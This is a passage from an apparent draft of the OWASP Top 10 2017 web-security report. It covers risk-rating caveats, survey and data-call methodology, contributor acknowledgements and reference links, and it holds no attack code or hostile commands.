<p>Note that this approach does not take the likelihood of the threat agent into account. Nor does it account for any of the various technical details associated with your particular application. Any of these factors could significantly affect the overall likelihood of an attacker finding and exploiting a particular vulnerability. This rating does not take into account the actual impact on your business. <em>Your organization</em> will have to decide how much security risk from applications and APIs the <em>organization</em> is willing to accept given your culture, industry, and regulatory environment. The purpose of the OWASP Top 10 is not to do this risk analysis for you.</p>
<p>The following illustrates our calculation of the risk for A6:2017 Security Misconfiguration.</p>
<p><img src="images/0xc0-risk-explanation.png" alt="Risk Calculation for A6:2017 Security Misconfiguration" /></p>
<h1 id="rf-details-about-risk-factors">+RF Details About Risk Factors</h1>
<h2 id="top-10-risk-factor-summary">Top 10 Risk Factor Summary</h2>
<p>The following table presents a summary of the 2017 Top 10 Application Security Risks, and the risk factors we have assigned to each risk. These factors were determined based on the available statistics and the experience of the OWASP Top 10 team. To understand these risks for a particular application or organization, <em>you must consider your own specific threat agents and business impacts</em>. Even severe software weaknesses may not present a serious risk if there are no threat agents in a position to perform the necessary attack or the business impact is negligible for the assets involved.</p>
<p><img src="images/0xc1-risk-factor-table.png" alt="Risk Factor Table" /></p>
<h2 id="additional-risks-to-consider">Additional Risks To Consider</h2>
<p>The Top 10 covers a lot of ground, but there are many other risks you should consider and evaluate in your organization. Some of these have appeared in previous versions of the Top 10, and others have not, including new attack techniques that are being identified all the time.  Other important application security risks (in alphabetical order) that you should additionally consider include:</p>
<ul>
<li>TBD - GOLDEN MASTER</li>
</ul>
<h1 id="dat-methodology-and-data">+Dat Methodology and Data</h1>
<p>At the OWASP Project Summit, active participants and community members decided on a vulnerability view, with up to two (2) forward looking vulnerability classes, with ordering defined partially by quantitative data, and partially by qualitative surveys.<br />
 </p>
<h2 id="industry-ranked-survey">Industry Ranked Survey</h2>
<p>For the survey, we collected the vulnerability categories that had been previously identified as being “on the cusp” or were mentioned in feedback to 2017 RC1 on the Top 10 mailing list. We put them into a ranked survey and asked respondents to rank the top four vulnerabilities that they felt should be included in the OWASP Top 10 2017. The survey was open from Aug 2 – Sep 18, 2017. 516 responses were collected and the vulnerabilities were ranked.</p>
<table style="width:12%;">
<colgroup>
<col style="width: 4%" />
<col style="width: 4%" />
<col style="width: 4%" />
</colgroup>
<thead>
<tr class="header">
<th style="text-align: left;">Rank</th>
<th style="text-align: left;">Survey Vulnerability Categories</th>
<th style="text-align: left;">Score</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: left;">1</td>
<td style="text-align: left;">Exposure of Private Information ('Privacy Violation') [CWE-359]</td>
<td style="text-align: left;">748</td>
</tr>
<tr class="even">
<td style="text-align: left;">2</td>
<td style="text-align: left;">Cryptographic Failures [CWE-310/311/312/326/327]</td>
<td style="text-align: left;">584</td>
</tr>
<tr class="odd">
<td style="text-align: left;">3</td>
<td style="text-align: left;">Deserialization of Untrusted Data [CWE-502]</td>
<td style="text-align: left;">514</td>
</tr>
<tr class="even">
<td style="text-align: left;">4</td>
<td style="text-align: left;">Authorization Bypass Through User-Controlled Key (IDOR &amp; Path Traversal) [CWE-639]</td>
<td style="text-align: left;">493</td>
</tr>
<tr class="odd">
<td style="text-align: left;">5</td>
<td style="text-align: left;">Insufficient Logging and Monitoring [CWE-223 / CWE-778]</td>
<td style="text-align: left;">440</td>
</tr>
</tbody>
</table>
<p>Exposure of private information is clearly the highest-ranking vulnerability, but fits very easily as an additional emphasis into the existing A3:2017 Sensitive Data Exposure. Cryptographic Failures can fit within Sensitive Data Exposure. Insecure deserialization was ranked at number three, so it was added to the Top 10 as A8:2017 after risk rating. The fourth ranked User Controlled Key is included in A5:2017 Broken Access Control; it is good to see it rank highly on the survey, as there is not much data relating to authorization vulnerabilities. The number five ranked category in the survey is Insufficient Logging and Monitoring, which we believe is a good fit for the Top 10 list, which is why it has become A10:2017. We have moved to a point where applications need to be able to define what may be an attack and generate appropriate logging, alerting, escalation and response. </p>
<h2 id="public-data-call">Public Data Call</h2>
<p>Traditionally, the data collected and analyzed was more along the lines of frequency data; how many vulnerabilities found in tested applications. As is well known, tools traditionally report all instances found of a vulnerability and humans traditionally report a single finding with a number of examples. This makes it very difficult to aggregate the two styles of reporting in a comparable manner.</p>
<p>For 2017, the incidence rate was calculated by how many applications in a given data set had one or more of a specific vulnerability type. The data from many larger contributors was provided in two views: The first was the traditional frequency style of counting every instance found of a vulnerability, the second was the count of applications that each vulnerability was found in (one or more time). While not perfect, this reasonably allows us to compare the data from Human Assisted Tools and Tool Assisted Humans. The raw data and analysis work is <a href="https://github.com/OWASP/Top10/tree/master/2017/datacall">available in GitHub</a>. We intend to expand on this with additional structure for 2020 (or earlier).</p>
<p>We received 40+ submissions in the call for data, as many were from the original data call that was focused on frequency, we were able to use data from 23 contributors covering ~114,000 applications. We used a one year block of time where possible and identified by the contributor. The majority of applications are unique, though we acknowledge the likelihood of some repeat applications between the yearly data from Veracode. The 23 datasets used were either identified as tool assisted human testing or specifically provided incidence rate from human assisted tools. Anomalies in the selected data of 100%+ incidence were adjusted down to 100% max. To calculate the incidence rate, we calculated the percentage of the total applications there were found to contain each vulnerability type. The ranking of incidence was used for the prevalence calculation in the overall risk for ranking the Top 10. </p>
<h1 id="acknowledgements">Acknowledgements</h1>
<h2 id="acknowledgements-to-data-contributors">Acknowledgements to Data Contributors</h2>
<p>We’d like to thank the many organizations that contributed their vulnerability data to support the 2017 update:</p>
<ul>
<li>MicroFocus Fortify</li>
<li>Veracode</li>
<li>Synopsis</li>
<li>Checkmarx</li>
<li>ContextIS</li>
<li>CDAC</li>
<li>Hidden</li>
<li>Colegio LaSalle Monteria</li>
<li>Linden Lab</li>
<li>ITsec Security Services bv</li>
<li>EZI</li>
<li>Edgescan</li>
<li>Purpletalk</li>
<li>AsTech Consulting</li>
<li>Network Test Labs Inc.</li>
<li>Derek Weeks</li>
<li>TCS</li>
<li>Easybss</li>
<li>I4 Consulting</li>
<li>ANCAP</li>
<li>Branding Brand</li>
<li>Vantage Point</li>
<li>EVRY</li>
<li>iBLISS Digital Security</li>
<li>Shape Security</li>
<li>Paladion Networks</li>
<li>Secure Network</li>
<li>Web</li>
<li>Contrast Security</li>
<li>Hamed</li>
<li>Khallaagh</li>
<li>DDoS.com</li>
<li>Minded Security</li>
<li>BUGemot</li>
<li>Softtek</li>
<li>M. Limacher IT Dienstleistungen</li>
<li>Osampa</li>
<li>Atos</li>
<li>National Center for Cyber Security Technology</li>
<li>SHCP</li>
</ul>
<p>For the first time, all the data contributed to a Top 10 release, and the full list of contributors, is <a href="https://github.com/OWASP/Top10/tree/master/2017/datacall/submissions">publicly available</a>.</p>
<h2 id="acknowledgements-to-individual-contributors">Acknowledgements to Individual Contributors</h2>
<p>We’d like to thank the individual contributors who spent many hours collectively contributing to the Top 10 in GitHub.</p>
<ul>
<li>ak47gen</li>
<li>davewichers</li>
<li>itscooper</li>
<li>ossie-git</li>
<li>tghosth</li>
<li>alonergan</li>
<li>drwetter</li>
<li>jeremylong</li>
<li>PauloASilva</li>
<li>thesp0nge</li>
<li>anantshri</li>
<li>ecbftw</li>
<li>jmanico</li>
<li>pontocom</li>
<li>toddgrotenhuis</li>
<li>bchurchill</li>
<li>gilzow</li>
<li>joaomatosf</li>
<li>psiinon</li>
<li>tsohlacol</li>
<li>bkimminich</li>
<li>h3xstream</li>
<li>jrmithdobbs</li>
<li>raesene</li>
<li>vanderaj</li>
<li>Boberski</li>
<li>HoLyVieR</li>
<li>jsteven</li>
<li>riramar</li>
<li>vdbaan</li>
<li>borischen</li>
<li>ilatypov</li>
<li>jvehent</li>
<li>sslHello</li>
<li>yohgaki</li>
<li>Calico90</li>
<li>infosecdad</li>
<li>koto</li>
<li>stefanb</li>
<li>Chris Frohoff</li>
<li>D00gs</li>
<li>irbishop</li>
<li>Neil-Smithline</li>
<li>taprootsec</li>
<li>Gabriel Lawrence</li>
</ul>
<h1 id="references-11">References</h1>
<p>NB: This section is not part of RC2, but might make it into the Golden Master. Comments welcome.</p>
<h2 id="owasp-flagship-projects-documents">OWASP Flagship Projects (Documents)</h2>
<p>The following OWASP Flagship documentation projects are most likely to be useful to users/adopters of this standard:</p>
<ul>
<li><a href="https://www.owasp.org/index.php/OWASP_Cheat_Sheet_Series">OWASP Cheat Sheets</a></li>
<li><a href="https://www.owasp.org/index.php/OWASP_Proactive_Controls">OWASP Proactive Controls</a></li>
<li><a href="https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project">OWASP Application Security Verification Standard</a></li>
<li><a href="https://www.owasp.org/index.php/OWASP_Testing_Project">OWASP Testing Guide</a></li>
<li><a href="https://www.owasp.org/index.php/OWASP_Top_10_Privacy_Risks_Project">OWASP Privacy Top 10 Risks</a></li>
<li><a href="https://www.owasp.org/index.php/Projects/OWASP_Mobile_Security_Project_-_Top_Ten_Mobile_Risks">OWASP Mobile Top 10 Risks</a></li>
<li><a href="https://www.owasp.org/index.php/OWASP_SAMM_Project">OWASP SAMM</a></li>
</ul>
<h2 id="owasp-flagship-projects-tools">OWASP Flagship Projects (Tools)</h2>
<p>The following projects are highly likely to be useful to adopters of the OWASP Top 10:</p>
<ul>
<li><a href="https://www.owasp.org/index.php/OWASP_AppSensor_Project">OWASP AppSensor</a></li>
<li><a href="https://www.owasp.org/index.php/OWASP_Dependency_Check">OWASP Dependency Check</a></li>
<li><a href="https://www.owasp.org/index.php/Category:OWASP_ModSecurity_Core_Rule_Set_Project">OWASP mod_security WAF Core Rule Set</a></li>
<li><a href="https://www.owasp.org/index.php/OWASP_OWTF">OWASP Open Web Testing Framework</a></li>
<li><a href="https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project">OWASP ZAP</a></li>
</ul>
<h2 id="owasp-lab-projects">OWASP Lab Projects</h2>
<p>These projects are working towards Flagship status, and might well achieve it before 2020.</p>
<ul>
<li><a href="https://www.owasp.org/index.php/OWASP_Guide_Project">OWASP Developer Guide</a></li>
<li><a href="https://www.owasp.org/index.php/OWASP_Juice_Shop_Project">OWASP Juice Shop</a></li>
<li><a href="https://www.owasp.org/index.php/OWASP_Secure_Software_Contract_Annex">OWASP Secure Contract Annex</a></li>
</ul>
<p>For a full list of projects, please see <a href="https://www.owasp.org/index.php/Category:OWASP_Project">OWASP Projects</a></p>
<h2 id="external-references">External references</h2>
<p>The following external sites reference the OWASP Top 10, and would likely be relevant to adopters.</p>
<ul>
<li><a href="https://cwe.mitre.org/">MITRE Common Weakness Enumeration</a></li>
<li><a href="https://www.pcisecuritystandards.org">PCI Security Standards Council</a></li>
<li><a href="https://www.pcisecuritystandards.org/document_library">PCI Data Security Standard (DSS)</a></li>
</ul>
</body>
</html>
